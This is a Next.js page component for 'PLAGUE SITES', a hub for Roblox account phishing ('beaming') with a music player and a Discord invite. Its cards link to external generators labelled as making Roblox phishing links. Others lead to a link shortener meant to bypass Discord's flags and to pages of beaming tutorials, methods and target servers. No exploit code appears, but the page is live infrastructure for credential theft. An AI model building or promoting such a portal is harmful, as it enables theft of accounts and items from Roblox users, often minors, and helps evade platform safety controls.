"use client"

import type React from "react"

import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { useState, useRef, useEffect } from "react"
import { Play, Pause, SkipBack, SkipForward, Volume2 } from "lucide-react"

export default function Home() {
  const [isPlaying, setIsPlaying] = useState(false)
  const [volume, setVolume] = useState(50)
  const [playlist] = useState([
    { title: "100", src: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Dean%20Blunt%20-%20100-Z5GjA1kk5lIidfxNBf94t0rojjjW2C.mp4" },
    { title: "the internet is where we met", src: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/kempachii-%20the%20internet%20is%20where%20we%20met%20%28slowed%20and%20reverbed%20to%20perfection%29-feIbARBW4AJ9gfXHozfmeIwgw15oy9.mp4" },
    { title: "Cigarettes out the Window", src: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/TV%20Girl%20-%20Cigarettes%20out%20the%20Window%20%28Lyrics%29-zKzjWx8ioUje36F2GgCEE7EACys0oC.mp4" },
    { title: "Untitled 05 Remix", src: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Kendrick%20Lamar%20-%20Untitled%2005%20%28LoVibe.%20Remix%29-NydeKz2DDHI0SLUjYfZN4rI24jYSmo.mp4" },
  ])
  const [currentSongIndex, setCurrentSongIndex] = useState(0)
  const audioRef = useRef<HTMLAudioElement>(null)

  const togglePlay = () => {
    if (audioRef.current) {
      if (isPlaying) {
        audioRef.current.pause()
      } else {
        audioRef.current.play()
      }
      setIsPlaying(!isPlaying)
    }
  }

  const skipToPrevious = () => {
    const newIndex = currentSongIndex === 0 ? playlist.length - 1 : currentSongIndex - 1
    setCurrentSongIndex(newIndex)
    setIsPlaying(false)
  }

  const skipToNext = () => {
    const newIndex = currentSongIndex === playlist.length - 1 ? 0 : currentSongIndex + 1
    setCurrentSongIndex(newIndex)
    setIsPlaying(false)
  }

  const handleSongEnd = () => {
    skipToNext()
    // Auto-play the next song
    setTimeout(() => {
      if (audioRef.current) {
        audioRef.current.play()
        setIsPlaying(true)
      }
    }, 100)
  }

  const handleVolumeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newVolume = Number.parseInt(e.target.value)
    setVolume(newVolume)
    if (audioRef.current) {
      audioRef.current.volume = newVolume / 100
    }
  }

  useEffect(() => {
    if (audioRef.current) {
      audioRef.current.volume = volume / 100
    }
  }, [volume])

  useEffect(() => {
    if (audioRef.current) {
      audioRef.current.load()
      audioRef.current.addEventListener("ended", handleSongEnd)

      return () => {
        if (audioRef.current) {
          audioRef.current.removeEventListener("ended", handleSongEnd)
        }
      }
    }
  }, [currentSongIndex])

  useEffect(() => {
    const startAutoplay = async () => {
      if (audioRef.current) {
        try {
          await audioRef.current.play()
          setIsPlaying(true)
        } catch (error) {
          // Autoplay was prevented by browser, user will need to click play
          console.log("[v0] Autoplay prevented by browser:", error)
        }
      }
    }

    // Small delay to ensure audio element is ready
    const timer = setTimeout(startAutoplay, 500)
    return () => clearTimeout(timer)
  }, [])

  const handleCardClick = () => {
    // Create a subtle click animation effect
    const clickEffect = (e: React.MouseEvent<HTMLDivElement>) => {
      const card = e.currentTarget
      card.style.transform = "scale(0.98)"
      setTimeout(() => {
        card.style.transform = "scale(1.05)"
        setTimeout(() => {
          card.style.transform = "scale(1)"
        }, 100)
      }, 100)
    }
    return clickEffect
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-purple-950 via-purple-900 to-black flex flex-col items-center p-4 relative overflow-hidden">
      <div className="absolute inset-0 pointer-events-none">
        <div className="floating-emoji" style={{ top: "20%", right: "10%", animationDelay: "2s" }}>
          ☠️
        </div>
        <div className="floating-emoji" style={{ top: "30%", left: "15%", animationDelay: "4s" }}>
          💀
        </div>
        <div className="floating-emoji" style={{ top: "50%", left: "8%", animationDelay: "3s" }}>
          💉
        </div>
        <div className="floating-emoji" style={{ top: "60%", right: "15%", animationDelay: "5s" }}>
          ⚠️
        </div>
        <div className="floating-emoji" style={{ top: "80%", right: "5%", animationDelay: "4.5s" }}>
          🚨
        </div>
        <div className="floating-emoji" style={{ top: "15%", left: "50%", animationDelay: "1.5s" }}>
          🧬
        </div>
        <div className="floating-emoji" style={{ top: "35%", right: "40%", animationDelay: "3.5s" }}>
          💀
        </div>
        <div className="floating-emoji" style={{ top: "55%", left: "60%", animationDelay: "0.5s" }}>
          ☠️
        </div>
        <div className="floating-emoji" style={{ top: "45%", right: "60%", animationDelay: "1.8s" }}>
          💉
        </div>
        <div className="floating-emoji" style={{ top: "65%", left: "40%", animationDelay: "3.2s" }}>
          ⚠️
        </div>
      </div>

      <div className="absolute top-4 left-4 bg-purple-900/80 backdrop-blur-sm border border-purple-500/50 rounded-lg p-2 shadow-lg">
        <div className="text-white text-xs mb-1">Now Playing</div>
        <div className="text-purple-200 font-medium mb-2 text-sm">{playlist[currentSongIndex].title}</div>

        <div className="flex items-center gap-1 mb-2">
          <Button
            size="sm"
            variant="ghost"
            className="text-white hover:text-purple-300 p-0.5 h-6 w-6"
            onClick={skipToPrevious}
          >
            <SkipBack size={12} />
          </Button>

          <Button
            size="sm"
            variant="ghost"
            className="text-white hover:text-purple-300 p-0.5 h-6 w-6"
            onClick={togglePlay}
          >
            {isPlaying ? <Pause size={12} /> : <Play size={12} />}
          </Button>

          <Button
            size="sm"
            variant="ghost"
            className="text-white hover:text-purple-300 p-0.5 h-6 w-6"
            onClick={skipToNext}
          >
            <SkipForward size={12} />
          </Button>
        </div>

        <div className="flex items-center gap-1">
          <Volume2 size={10} className="text-purple-300" />
          <input
            type="range"
            min="0"
            max="100"
            value={volume}
            onChange={handleVolumeChange}
            className="w-16 h-1 bg-purple-700 rounded-lg appearance-none cursor-pointer slider"
          />
          <span className="text-xs text-purple-300">{volume}%</span>
        </div>

        <audio ref={audioRef}>
          <source src={playlist[currentSongIndex].src} type="audio/mp4" />
        </audio>
      </div>

      <a
        href="https://discord.gg/F4PJCjfptr"
        target="_blank"
        rel="noopener noreferrer"
        className="absolute top-4 right-4 bg-purple-600/80 hover:bg-purple-500/90 text-white px-4 py-2 rounded-lg text-sm font-medium backdrop-blur-sm border border-purple-400/30 hover:border-purple-300/50 transition-all duration-300 hover:scale-105 shadow-lg hover:shadow-purple-500/30"
      >
        Join Discord
      </a>

      <h1 className="text-6xl font-black text-white mb-8 mt-8 text-center tracking-wide futuristic-title">
        PLAGUE SITES
      </h1>

      <div className="flex flex-col gap-8 max-w-6xl w-full flex-1 items-center justify-center">
        {/* First Row */}
        <div className="flex flex-col md:flex-row gap-8 w-full">
          {/* Immortal Portal - moved to first position */}
          <Card
            className="flex-1 bg-purple-900/30 border-purple-500/50 backdrop-blur-sm shadow-2xl shadow-purple-500/20 hover:shadow-purple-500/40 transition-all duration-300 hover:scale-105 relative cursor-pointer active:scale-95"
            onClick={handleCardClick()}
          >
            <div className="absolute top-3 right-3 text-purple-300/70 text-sm">👤</div>
            <CardHeader className="text-center pb-1">
              <CardTitle className="text-xl font-bold text-white mb-1">IMMORTAL</CardTitle>
              <CardDescription className="text-purple-200 text-xs">
                Immortal Gen For Roblox Phishing Links
              </CardDescription>
            </CardHeader>
            <CardContent className="text-center">
              <a href="https://immortal.st/?code=MTY5MDk0Nzk3NjU4MDIxMTM1" target="_blank" rel="noopener noreferrer">
                <Button className="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1 rounded-full text-xs font-semibold shadow-lg hover:shadow-purple-500/50 transition-all duration-300">
                  🚀 Enter
                </Button>
              </a>
            </CardContent>
          </Card>

          {/* Splunk Portal - moved to second position */}
          <Card
            className="flex-1 bg-purple-900/30 border-purple-500/50 backdrop-blur-sm shadow-2xl shadow-purple-500/20 hover:shadow-purple-500/40 transition-all duration-300 hover:scale-105 relative cursor-pointer active:scale-95"
            onClick={handleCardClick()}
          >
            <div className="absolute top-3 right-3 text-purple-300/70 text-sm">👤</div>
            <CardHeader className="text-center pb-1">
              <CardTitle className="text-xl font-bold text-white mb-1">SPLUNK</CardTitle>
              <CardDescription className="text-purple-200 text-xs">
                Splunk Gen for Roblox Phishing Links
              </CardDescription>
            </CardHeader>
            <CardContent className="text-center">
              <a href="https://app.beamers.si/u/PlagueBeamz" target="_blank" rel="noopener noreferrer">
                <Button className="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1 rounded-full text-xs font-semibold shadow-lg hover:shadow-purple-500/50 transition-all duration-300">
                  🎮 Enter
                </Button>
              </a>
            </CardContent>
          </Card>

          {/* Short URL */}
          <Card
            className="flex-1 bg-purple-900/30 border-purple-500/50 backdrop-blur-sm shadow-2xl shadow-purple-500/20 hover:shadow-purple-500/40 transition-all duration-300 hover:scale-105 relative cursor-pointer active:scale-95"
            onClick={handleCardClick()}
          >
            <div className="absolute top-3 right-3 text-purple-300/70 text-sm">👤</div>
            <CardHeader className="text-center pb-1">
              <CardTitle className="text-xl font-bold text-white mb-1">SHORT URL</CardTitle>
              <CardDescription className="text-purple-200 text-xs">
                Shorting Links to Bypass Discord Flags
              </CardDescription>
            </CardHeader>
            <CardContent className="text-center">
              <a href="/short-url">
                <Button className="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1 rounded-full text-xs font-semibold shadow-lg hover:shadow-purple-500/50 transition-all duration-300">
                  ✨ Enter
                </Button>
              </a>
            </CardContent>
          </Card>
        </div>

        {/* Second Row */}
        <div className="flex flex-col md:flex-row gap-8 w-full">
          <Card
            className="flex-1 bg-purple-900/30 border-purple-500/50 backdrop-blur-sm shadow-2xl shadow-purple-500/20 hover:shadow-purple-500/40 transition-all duration-300 hover:scale-105 relative cursor-pointer active:scale-95"
            onClick={handleCardClick()}
          >
            <div className="absolute top-3 right-3 text-purple-300/70 text-sm">👤</div>
            <CardHeader className="text-center pb-1">
              <CardTitle className="text-xl font-bold text-white mb-1">TUTORIALS</CardTitle>
              <CardDescription className="text-purple-200 text-xs">Tutorials For Beaming</CardDescription>
            </CardHeader>
            <CardContent className="text-center">
              <Button className="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1 rounded-full text-xs font-semibold shadow-lg hover:shadow-purple-500/50 transition-all duration-300">
                🌐 Enter
              </Button>
            </CardContent>
          </Card>

          <Card
            className="flex-1 bg-purple-900/30 border-purple-500/50 backdrop-blur-sm shadow-2xl shadow-purple-500/20 hover:shadow-purple-500/40 transition-all duration-300 hover:scale-105 relative cursor-pointer active:scale-95"
            onClick={handleCardClick()}
          >
            <div className="absolute top-3 right-3 text-purple-300/70 text-sm">👤</div>
            <CardHeader className="text-center pb-1">
              <CardTitle className="text-xl font-bold text-white mb-1">METHODS</CardTitle>
              <CardDescription className="text-purple-200 text-xs">Methods to Get Beams</CardDescription>
            </CardHeader>
            <CardContent className="text-center">
              <a href="/methods">
                <Button className="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1 rounded-full text-xs font-semibold shadow-lg hover:shadow-purple-500/50 transition-all duration-300">
                  ⚛️ Enter
                </Button>
              </a>
            </CardContent>
          </Card>

          <Card
            className="flex-1 bg-purple-900/30 border-purple-500/50 backdrop-blur-sm shadow-2xl shadow-purple-500/20 hover:shadow-purple-500/40 transition-all duration-300 hover:scale-105 relative cursor-pointer active:scale-95"
            onClick={handleCardClick()}
          >
            <div className="absolute top-3 right-3 text-purple-300/70 text-sm">👤</div>
            <CardHeader className="text-center pb-1">
              <CardTitle className="text-xl font-bold text-white mb-1">SERVERS</CardTitle>
              <CardDescription className="text-purple-200 text-xs">Servers to Beam in</CardDescription>
            </CardHeader>
            <CardContent className="text-center">
              <a href="/servers">
                <Button className="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1 rounded-full text-xs font-semibold shadow-lg hover:shadow-purple-500/50 transition-all duration-300">
                  💻 Enter
                </Button>
              </a>
            </CardContent>
          </Card>
        </div>
      </div>

      <div className="absolute bottom-4 left-4 text-purple-300/70 text-sm">© PlagueBeamz</div>
    </div>
  )
}
